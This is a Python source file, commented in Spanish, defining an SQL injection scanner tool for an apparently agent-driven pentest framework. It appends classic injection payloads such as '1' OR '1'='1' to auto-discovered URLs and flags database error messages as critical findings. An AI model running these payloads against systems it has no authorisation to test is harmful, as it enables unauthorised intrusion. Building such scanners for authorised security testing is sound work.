import requests
from core.mcp_protocol import MCPTool
from core.auto_discovery import AutoDiscovery  # <--- IMPORTANTE


class SQLiScanner(MCPTool):
    def __init__(self, project_id, guardian):
        super().__init__(
            name="SQL Injection Scanner",
            description="Escaneo inteligente de SQLi (Auto-Discovery integrado)",
            mitre_id="T1190",
            project_id=project_id,
            guardian=guardian,
        )
        self.payloads = ["'", '"', "1' OR '1'='1", '1" OR "1"="1']
        self.errors = [
            "You have an error",
            "Warning: mysql_",
            "syntax error",
            "Unclosed quotation",
        ]

    def _attack(self, target_url):
        """Ataca una URL específica que ya sabemos que tiene parámetros"""
        print(f"    ⚔️  Inyectando: {target_url}")

        for payload in self.payloads:
            attack_url = f"{target_url}{payload}"
            try:
                res = requests.get(attack_url, timeout=3)
                for err in self.errors:
                    if err in res.text:
                        print(f"      🔥 SQLi DETECTADO! Payload: {payload}")
                        self.save_finding(
                            title="SQL Injection (Critical)",
                            target=target_url,
                            evidence=f"Payload: {payload}\nError: {err}",
                            severity="Critical",
                            cvss_score=9.8,
                        )
                        return True
            except:
                pass
        return False

    def _execute(self, user_input):
        # 1. Llamamos al Motor de Descubrimiento
        # Él se encarga de saber si es http/https, buscar archivos y buscar parámetros.
        discoverer = AutoDiscovery()
        targets = discoverer.resolve_targets(user_input)

        if not targets:
            print("    ❌ No se pudo armar una superficie de ataque válida.")
            return {"status": "FAILED"}

        print(
            f"\n    [*] Iniciando ataque sobre {len(targets)} objetivos confirmados..."
        )
        vulns = 0

        # 2. Atacamos la lista limpia que nos devolvió el motor
        for t in targets:
            if self._attack(t):
                vulns += 1

        return {"status": "FINISHED", "vulns": vulns}
